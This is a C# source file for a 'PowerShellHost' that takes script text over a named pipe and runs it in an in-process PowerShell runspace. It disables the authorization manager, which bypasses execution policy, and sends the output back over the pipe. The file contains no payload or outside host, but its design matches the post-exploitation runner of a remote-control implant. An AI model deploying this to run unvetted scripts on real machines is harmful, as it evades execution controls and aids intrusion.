using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using PhantomInterop.Classes.IO;
using System.Management.Automation.Runspaces;
using PhantomInterop.Serializers;
using System.Collections.Concurrent;
using PhantomInterop.Classes;
using System.Threading;
using PhantomInterop.Classes.Core;
using PhantomInterop.Structs.PhantomStructs;
using PhantomInterop.Interfaces;
using ST = System.Threading.Tasks;
using PhantomInterop.Enums.PhantomEnums;
using System.IO;
using System.IO.Pipes;
using PhantomInterop.Constants;
using PhantomInterop.Classes.Events;

namespace PowerShellHost
{
    class Runtime
    {

        private static JsonHandler _dataSerializer = new JsonHandler();
        private static string _namedPipeName;
        private static ConcurrentQueue<byte[]> _msgSendQueue = new ConcurrentQueue<byte[]>();
        private static ConcurrentQueue<ICommandMessage> _recieverQueue = new ConcurrentQueue<ICommandMessage>();
        private static AsyncNamedPipeServer _server;
        private static AutoResetEvent _msgSendEvent = new AutoResetEvent(false);
        private static AutoResetEvent _msgRecvEvent = new AutoResetEvent(false);
        private static ConcurrentDictionary<string, ChunkStore<DataChunk>> DataStore = new ConcurrentDictionary<string, ChunkStore<DataChunk>>();
        private static CancellationTokenSource _cts = new CancellationTokenSource();
        private static Action<object> _transmitAction;
        private static ST.Task _clientConnectedTask = null;

        static void Main(string[] args)
        {

            if (args.Length != 1)
            {
                throw new Exception("No named pipe name given.");
            }
            _namedPipeName = args[0];

            _transmitAction = (object p) =>
            {
                PipeStream pipe = (PipeStream)p;

                while (pipe.IsConnected && !_cts.IsCancellationRequested)
                {
                    WaitHandle.WaitAny(new WaitHandle[] {
                        _msgSendEvent,
                        _cts.Token.WaitHandle
                    });
                    while (_msgSendQueue.TryDequeue(out byte[] message))
                    {
                        pipe.BeginWrite(message, 0, message.Length, ProcessSentMessage, pipe);
                    }
                }
                while (_msgSendQueue.TryDequeue(out byte[] message))
                {
                    pipe.BeginWrite(message, 0, message.Length, ProcessSentMessage, pipe);
                }
                pipe.WaitForPipeDrain();
                pipe.Close();
            };
            _server = new AsyncNamedPipeServer(_namedPipeName, null, 1, IPC.SEND_SIZE, IPC.RECV_SIZE);
            _server.ConnectionEstablished += OnAsyncConnect;
            _server.MessageReceived += ProcessReceivedMessage;
            _msgRecvEvent.WaitOne();
            if (_recieverQueue.TryDequeue(out ICommandMessage psArgs))
            {
                if (psArgs.GetTypeCode() != MessageType.IPCCommandArguments)
                {
                    throw new Exception($"Got invalid message type. Wanted {MessageType.IPCCommandArguments}, got {psArgs.GetTypeCode()}");
                }
                TextWriter oldStdout = Console.Out;
                TextWriter oldStderr = Console.Error;

                EventableStringWriter stdoutSw = new EventableStringWriter();
                EventableStringWriter stderrSw = new EventableStringWriter();

                stdoutSw.BufferWritten += OnBufferWrite;
                stderrSw.BufferWritten += OnBufferWrite;

                Console.SetOut(stdoutSw);
                Console.SetError(stderrSw);
                CustomPowerShellHost psHost = new CustomPowerShellHost();
                var state = InitialSessionState.CreateDefault();
                state.AuthorizationManager = null;
                try
                {
                    using (Runspace runspace = RunspaceFactory.CreateRunspace(psHost, state))
                    {
                        runspace.Open();

                        using (Pipeline pipeline = runspace.CreatePipeline())
                        {
                            pipeline.Commands.AddScript(((IPCCommandArguments)psArgs).StringData);
                            pipeline.Commands[0].MergeMyResults(PipelineResultTypes.Error, PipelineResultTypes.Output);
                            pipeline.Commands.Add("Out-Default");
                            pipeline.Invoke();
                        }
                    }
                } catch (Exception ex)
                {
                    Console.WriteLine($"[PowerShellHost Error] : Unhandled exception: {ex.Message}");
                } finally
                {
                    while(_msgSendQueue.Count > 0)
                    {
                        Thread.Sleep(1000);
                    }
                    Console.SetOut(oldStdout);
                    Console.SetOut(oldStderr);
                }
                _cts.Cancel();
                // Wait for the pipe client comms to finish
                while (_clientConnectedTask is ST.Task task && !_clientConnectedTask.IsCompleted)
                {
                    task.Wait(1000);
                }
            }


        }

        private static void OnBufferWrite(object sender, PhantomInterop.Classes.Events.StringDataEventArgs e)
        {
            if (e.Data != null)
            {
                try
                {
                    _msgSendQueue.Enqueue(Encoding.UTF8.GetBytes(e.Data));
                    _msgSendEvent.Set();
                }
                catch
                {

                }

            }
        }

        private static void ProcessSentMessage(IAsyncResult result)
        {
            PipeStream pipe = (PipeStream)result.AsyncState;
            pipe.EndWrite(result);
            pipe.Flush();
        }

        private static void ProcessReceivedMessage(object sender, PipeMessageData args)
        {
            DataChunk chunkedData = _dataSerializer.Deserialize<DataChunk>(
                Encoding.UTF8.GetString(args.Data.Data.Take(args.Data.DataLength).ToArray()));
            lock (DataStore)
            {
                if (!DataStore.ContainsKey(chunkedData.ID))
                {
                    DataStore[chunkedData.ID] = new ChunkStore<DataChunk>();
                    DataStore[chunkedData.ID].MessageComplete += HandleIncomingData;
                }
            }
            DataStore[chunkedData.ID].AddMessage(chunkedData);
        }

        private static void HandleIncomingData(object sender, ChunkEventData<DataChunk> args)
        {
            MessageType mt = args.Chunks[0].Message;
            List<byte> data = new List<byte>();

            for (int i = 0; i < args.Chunks.Length; i++)
            {
                data.AddRange(Convert.FromBase64String(args.Chunks[i].Data));
            }

            ICommandMessage msg = _dataSerializer.DeserializeIPCMessage(data.ToArray(), mt);
            //Console.WriteLine("We got a message: {0}", mt.ToString());
            _recieverQueue.Enqueue(msg);
            _msgRecvEvent.Set();
        }

        public static void OnAsyncConnect(object sender, PipeMessageData args)
        {
            // We only accept one connection at a time, sorry.
            if (_clientConnectedTask != null)
            {
                args.Pipe.Close();
                return;
            }
            _clientConnectedTask = new ST.Task(_transmitAction, args.Pipe);
            _clientConnectedTask.Start();
        }
    }
}
